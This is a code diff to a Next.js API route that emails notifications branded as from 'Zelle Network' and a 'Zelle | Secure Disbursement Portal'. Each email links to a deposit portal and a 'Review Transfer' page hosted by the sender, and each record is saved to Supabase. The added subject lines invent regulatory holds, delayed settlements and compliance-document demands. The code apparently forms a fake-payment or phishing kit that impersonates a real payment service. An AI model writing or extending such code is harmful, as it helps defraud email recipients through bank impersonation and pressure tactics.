@@ -1,5 +1,12 @@
 import { NextResponse } from "next/server"
 import { generateEmailByTemplateId } from "@/lib/email-template-generators"
+import {
+  generateTransferId,
+  generateAccessToken,
+  buildDepositLink,
+  buildSendReviewLink,
+  saveTransfer,
+} from "@/services/transferService"
 
 export async function POST(request: Request) {
   try {
@@ -29,6 +36,9 @@ export async function POST(request: Request) {
     if (isNaN(amountNum) || amountNum <= 0) {
       return NextResponse.json({ error: "Invalid amount" }, { status: 400 })
     }
+    if (amountNum > 100000) {
+      return NextResponse.json({ error: "Single transfer limit is $100,000 USD." }, { status: 400 })
+    }
 
     // Check for Resend API key
     const resendApiKey = process.env.RESEND_API_KEY
@@ -40,23 +50,29 @@ export async function POST(request: Request) {
       )
     }
 
-    const transferId = `ZELLE-${Date.now().toString().slice(-6)}-${Math.random().toString(36).substring(2, 9).toUpperCase()}`
-    const timestamp = new Date().toISOString()
+    const transferId = generateTransferId()
+    const accessToken = generateAccessToken()
+    const timestamp  = new Date().toISOString()
 
-    // Build deposit link
+    // Resolve app origin
     const appOrigin =
       process.env.NEXT_PUBLIC_APP_URL?.replace(/\/$/, "") ||
       (request.headers.get("origin") ?? request.headers.get("referer")?.replace(/\/[^/]*$/, "") ?? "")
-    const depositParams = new URLSearchParams({
+
+    // Build deposit-portal link (unique per transfer)
+    const depositLink = buildDepositLink(appOrigin, {
       transferId,
-      amount: amountNum.toString(),
-      recipient: recipientEmail,
+      amount:        amountNum,
+      recipient:     recipientEmail,
       recipientName,
-      bankName: "Zelle Network",
-      message: message || "",
+      bankName:      "Zelle Network",
+      message:       message || "",
       timestamp,
+      accessToken,
     })
-    const depositLink = `${appOrigin}/deposit-portal/client?${depositParams.toString()}`
+
+    // Build /send review link (injected into email as the "Review Transfer" CTA)
+    const sendLink = buildSendReviewLink(appOrigin, transferId, accessToken)
 
     // Resolve template ID
     const resolvedBase = templateId || "transfer-received"
@@ -65,13 +81,14 @@ export async function POST(request: Request) {
     // Generate email HTML using the template system
     const emailHtml = generateEmailByTemplateId(resolvedId, {
       recipientName,
-      amount: amountNum,
-      message: message || undefined,
+      amount:      amountNum,
+      message:     message || undefined,
       transferId,
       depositLink,
-      senderName: "Zelle Network",
+      sendLink,
+      senderName:  "Zelle Network",
       institution: "Zelle | Secure Disbursement Portal",
-      bankName: "Zelle",
+      bankName:    "Zelle",
     })
 
     if (!emailHtml) {
@@ -111,9 +128,15 @@ export async function POST(request: Request) {
       "account-suspended":         `Your Zelle account has been temporarily suspended`,
       "referral-bonus":            `You've earned a Zelle referral bonus!`,
       "kyc-verification":          `Action Required: Verify your Zelle identity`,
-      "aml-hold":                  `Zelle transaction hold — compliance review`,
-      "monthly-statement":         `Your Zelle monthly statement is ready`,
-      "large-transaction-review":  `Large Zelle transaction — additional verification required`,
+      "aml-hold":                           `Zelle transaction hold — compliance review`,
+      "monthly-statement":                  `Your Zelle monthly statement is ready`,
+      "large-transaction-review":           `Large Zelle transaction — additional verification required`,
+      "settlement-confirmation":            `Settlement Confirmed — Funds Deposited to Your Account`,
+      "settlement-delayed":                 `Settlement Delayed — Your Funds Are Pending`,
+      "regulatory-hold":                    `Regulatory Hold Placed on Your Transaction`,
+      "compliance-document-request":        `Action Required — Compliance Documents Needed`,
+      "settlement-summary":                 `Your Settlement Summary`,
+      "dispute-resolution":                 `Dispute Update — Case #${transferId}`,
     }
 
     const subject =
@@ -182,9 +205,30 @@ export async function POST(request: Request) {
       )
     }
 
+    // Persist transfer record to Supabase + warm in-memory cache
+    await saveTransfer({
+      transfer_id:     transferId,
+      access_token:    accessToken,
+      recipient_email: recipientEmail,
+      recipient_name:  recipientName,
+      amount:          amountNum,
+      message:         message || undefined,
+      sender_name:     "Zelle Network",
+      institution:     "Zelle | Secure Disbursement Portal",
+      bank_name:       "Zelle",
+      template_id:     resolvedBase,
+      language:        language || "en",
+      deposit_link:    depositLink,
+      send_link:       sendLink,
+      email_id:        resendData?.id,
+      status:          "sent",
+    })
+
     return NextResponse.json({
       success: true,
       transferId,
+      depositLink,
+      sendLink,
       emailId: resendData?.id,
       message: "Zelle payment notification sent successfully",
     })
